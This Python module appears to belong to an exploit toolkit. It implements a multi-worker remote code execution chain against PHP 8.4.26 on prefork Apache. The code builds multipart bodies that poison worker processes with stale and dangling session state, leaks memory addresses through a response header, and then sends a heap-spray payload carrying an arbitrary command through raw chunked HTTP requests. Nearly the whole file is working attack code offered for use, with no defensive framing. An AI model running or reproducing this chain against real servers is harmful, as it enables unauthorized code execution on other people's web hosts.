#!/usr/bin/env python3
"""Multi-worker HTTP mechanics for the 8.4.26 pure chain.

The single-worker chain assumes A1, B1, A2, B2 all run in the same prefork
child. On a multi-worker Apache, A1 and B1 are separate connections and the
cache of poisoned children has to be sprayed:

  A1 wave  -> poison every child with the stale PS(id)
  B1       -> OOB leak from any poisoned child
  A2 wave  -> poison every child with the dangling PS(http_session_vars)
  B2       -> execute in any A2-poisoned child

A1 and A2 return HTTP/1.0 500 with Connection: close; the child survives
with its stale state, but the TCP connection does not. The wave sizes are
therefore concurrency over *new* connections, not a single keep-alive
connection.

This module is deliberately separate from pure_shell.py so the single-worker
path stays unchanged. pure_shell.py imports it only for --multi.
"""
from __future__ import annotations

import concurrent.futures
import os
import socket
import subprocess
import sys
import tempfile
import time

HERE = os.path.dirname(os.path.abspath(__file__))
PAYLOADS = os.path.join(HERE, "payloads")
if PAYLOADS not in sys.path:
    sys.path.insert(0, PAYLOADS)

from cheap_oom_a import build_body as _build_a2  # type: ignore
from fake_ref_b import make_name, make_spray  # type: ignore
from mk_ht import build as _build_ht  # type: ignore

BOUNDARY = b"C" * 10
Q = "?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"
LEAK_SPEC = ",".join(["G:511:0x137"] * 14 + ["G:400:0x137", "G:511:0x137", "X:900"])
A2_PARTS = 880
A2_DEPTH = 64
A2_FILLERS = 115
B2_VL = 384
B2_N1 = 500
B2_N2 = 495


def make_a1_body(tmp: str) -> bytes:
    out = os.path.join(tmp, "a1.bin")
    subprocess.run(
        [sys.executable, os.path.join(PAYLOADS, "mk_a1.py"),
         "--out", out, "--big", "78"],
        check=True, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
    with open(out, "rb") as fh:
        return fh.read()


def make_b1_body(tmp: str) -> bytes:
    out = os.path.join(tmp, "b1.bin")
    subprocess.run(
        [sys.executable, os.path.join(PAYLOADS, "mk_leak_b.py"),
         "--out", out, "--spec", LEAK_SPEC,
         "--fake-len", "0xC8000", "--tag"],
        check=True, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
    with open(out, "rb") as fh:
        return fh.read()


def make_a2_body(sid: bytes = b"a" * 32, progress: bytes = b"k0") -> bytes:
    return _build_a2(A2_PARTS, A2_DEPTH, A2_FILLERS, sid, progress, BOUNDARY)


def make_b2_body(s_addr: int, zif: int, cmd: bytes,
                 sid: bytes = b"a" * 32, progress: bytes = b"k0") -> bytes:
    ht = _build_ht(s_addr, zif, cmd, B2_VL)
    spray = make_spray(B2_VL, s_addr, 1, 0x0107, 8, 32)

    def part(name: bytes, value: bytes) -> bytes:
        return (b"--" + BOUNDARY + b"\r\nContent-Disposition: form-data; name=\"" +
                name + b"\"\r\n\r\n" + value + b"\r\n")

    body = bytearray()
    for i in range(B2_N1):
        body += part(make_name(b"s", i, 10), spray)
    body += part(b"ht", ht)
    body += part(b"PHPSESSID", sid)
    body += part(b"PHP_SESSION_UPLOAD_PROGRESS", progress)
    for i in range(B2_N2):
        body += part(make_name(b"t", i, 10), spray)
    body += b"--" + BOUNDARY + b"--\r\n"
    return bytes(body)


def _read_headers(sock: socket.socket, buf: bytes, timeout: float) -> bytes:
    sock.settimeout(timeout)
    while b"\r\n\r\n" not in buf:
        chunk = sock.recv(65536)
        if not chunk:
            raise EOFError("closed before response headers")
        buf += chunk
    head, _ = buf.split(b"\r\n\r\n", 1)
    return head


def _parse_status(head: bytes) -> str:
    return head.split(b"\r\n", 1)[0].decode("latin1", "replace")


def _parse_headers(head: bytes) -> dict[bytes, bytes]:
    headers: dict[bytes, bytes] = {}
    for line in head.split(b"\r\n")[1:]:
        k, _, v = line.partition(b":")
        if k:
            headers[k.strip().lower()] = v.strip()
    return headers


def _drain_body(sock: socket.socket, buf: bytes, headers: dict[bytes, bytes],
                timeout: float) -> bytes:
    """Read and discard the response body. Returns leftover buffer bytes."""
    sock.settimeout(timeout)
    head_end = buf.find(b"\r\n\r\n")
    if head_end < 0:
        return buf
    buf = buf[head_end + 4:]
    te = headers.get(b"transfer-encoding", b"").lower()
    cl = headers.get(b"content-length")
    if b"chunked" in te:
        while True:
            while b"\r\n" not in buf:
                chunk = sock.recv(65536)
                if not chunk:
                    return buf
                buf += chunk
            line, buf = buf.split(b"\r\n", 1)
            try:
                size = int(line.split(b";")[0], 16)
            except ValueError:
                return buf
            need = size + 2
            while len(buf) < need:
                chunk = sock.recv(65536)
                if not chunk:
                    return buf
                buf += chunk
            buf = buf[need:]
            if size == 0:
                return buf
    if cl is not None:
        try:
            n = int(cl)
        except ValueError:
            return buf
        while len(buf) < n:
            chunk = sock.recv(65536)
            if not chunk:
                return buf
            buf += chunk
        return buf[n:]
    # No framing. Only drain if the server said it will close.
    if headers.get(b"connection", b"").lower() == b"close":
        while True:
            chunk = sock.recv(65536)
            if not chunk:
                return buf
            buf += chunk
    return buf


def send_chunked(host: str, port: int, path: str, body: bytes,
                 timeout: float = 180.0) -> tuple[str, dict[bytes, bytes]]:
    """Send one chunked POST. Returns (status, headers). Body is discarded."""
    s = socket.create_connection((host, port), timeout=timeout)
    try:
        hdr = (("POST %s HTTP/1.1\r\nHost: %s:%d\r\n"
                "Content-Type: multipart/form-data; boundary=%s\r\n"
                "Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n")
               % (path, host, port, BOUNDARY.decode())).encode()
        s.sendall(hdr)
        for i in range(0, len(body), 65536):
            piece = body[i:i + 65536]
            s.sendall(("%x\r\n" % len(piece)).encode() + piece + b"\r\n")
        s.sendall(b"0\r\n\r\n")
        buf = b""
        while b"\r\n\r\n" not in buf:
            chunk = s.recv(65536)
            if not chunk:
                raise EOFError("closed before response headers")
            buf += chunk
        head, _ = buf.split(b"\r\n\r\n", 1)
        headers = _parse_headers(head)
        _drain_body(s, buf, headers, timeout)
        return _parse_status(head), headers
    finally:
        s.close()


def send_plain(host: str, port: int, path: str, body: bytes,
               timeout: float = 180.0) -> tuple[str, dict[bytes, bytes], bytes]:
    """Send one Content-Length POST. Returns (status, headers, body)."""
    s = socket.create_connection((host, port), timeout=timeout)
    try:
        hdr = (("POST %s HTTP/1.1\r\nHost: %s:%d\r\n"
                "Content-Type: multipart/form-data; boundary=%s\r\n"
                "Content-Length: %d\r\nConnection: close\r\n\r\n")
               % (path, host, port, BOUNDARY.decode(), len(body))).encode()
        s.sendall(hdr + body)
        buf = b""
        while b"\r\n\r\n" not in buf:
            chunk = s.recv(65536)
            if not chunk:
                raise EOFError("closed before response headers")
            buf += chunk
        head, bodybuf = buf.split(b"\r\n\r\n", 1)
        headers = _parse_headers(head)
        te = headers.get(b"transfer-encoding", b"").lower()
        cl = headers.get(b"content-length")
        out = b""
        if b"chunked" in te:
            while True:
                while b"\r\n" not in bodybuf:
                    chunk = s.recv(65536)
                    if not chunk:
                        return _parse_status(head), headers, out
                    bodybuf += chunk
                line, bodybuf = bodybuf.split(b"\r\n", 1)
                size = int(line.split(b";")[0], 16)
                need = size + 2
                while len(bodybuf) < need:
                    chunk = s.recv(65536)
                    if not chunk:
                        return _parse_status(head), headers, out
                    bodybuf += chunk
                out += bodybuf[:size]
                bodybuf = bodybuf[need:]
                if size == 0:
                    break
        elif cl is not None:
            n = int(cl)
            while len(bodybuf) < n:
                chunk = s.recv(65536)
                if not chunk:
                    return _parse_status(head), headers, out
                bodybuf += chunk
            out = bodybuf[:n]
        return _parse_status(head), headers, out
    finally:
        s.close()


def send_b1_headers(host: str, port: int, path: str, body: bytes,
                    timeout: float = 240.0) -> bytes:
    """Send B1 and return the raw response header block (leak cookie)."""
    s = socket.create_connection((host, port), timeout=timeout)
    try:
        hdr = (("POST %s HTTP/1.1\r\nHost: %s:%d\r\n"
                "Content-Type: multipart/form-data; boundary=%s\r\n"
                "Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n")
               % (path, host, port, BOUNDARY.decode())).encode()
        s.sendall(hdr)
        for i in range(0, len(body), 65536):
            piece = body[i:i + 65536]
            s.sendall(("%x\r\n" % len(piece)).encode() + piece + b"\r\n")
        s.sendall(b"0\r\n\r\n")
        buf = b""
        while b"\r\n\r\n" not in buf:
            chunk = s.recv(65536)
            if not chunk:
                raise EOFError("closed before response headers")
            buf += chunk
        head, _ = buf.split(b"\r\n\r\n", 1)
        headers = _parse_headers(head)
        _drain_body(s, buf, headers, timeout)
        return head
    finally:
        s.close()


def poison_a1(host: str, port: int, path: str, body: bytes, workers: int,
              timeout: float = 180.0) -> list[str]:
    def one() -> str:
        try:
            st, _ = send_chunked(host, port, path + Q, body, timeout)
            return st
        except Exception as exc:
            return "ERR %r" % (exc,)

    with concurrent.futures.ThreadPoolExecutor(max_workers=max(1, workers)) as ex:
        return [f.result() for f in
                concurrent.futures.as_completed([ex.submit(one) for _ in range(workers)])]


def poison_a2(host: str, port: int, path: str, body: bytes, workers: int,
              waves: int, delay: float = 0.2,
              timeout: float = 180.0) -> list[str]:
    def one() -> str:
        try:
            st, _, _ = send_plain(host, port, path, body, timeout)
            return st
        except Exception as exc:
            return "ERR %r" % (exc,)

    out: list[str] = []
    for _ in range(max(1, waves)):
        with concurrent.futures.ThreadPoolExecutor(max_workers=max(1, workers)) as ex:
            out.extend(f.result() for f in
                       concurrent.futures.as_completed(
                           [ex.submit(one) for _ in range(workers)]))
        time.sleep(delay)
    return out


def leak_b1(host: str, port: int, path: str, body: bytes,
            timeout: float = 240.0) -> bytes:
    """A1 must already have poisoned some children. Returns B1 header block."""
    return send_b1_headers(host, port, path, body, timeout)


def execute_b2(host: str, port: int, path: str, body: bytes,
               timeout: float = 180.0) -> tuple[str, dict[bytes, bytes], bytes]:
    """Send B2. A success often closes the connection before a response."""
    try:
        return send_plain(host, port, path, body, timeout)
    except Exception as exc:
        return "EOF %r" % (exc,), {}, b""
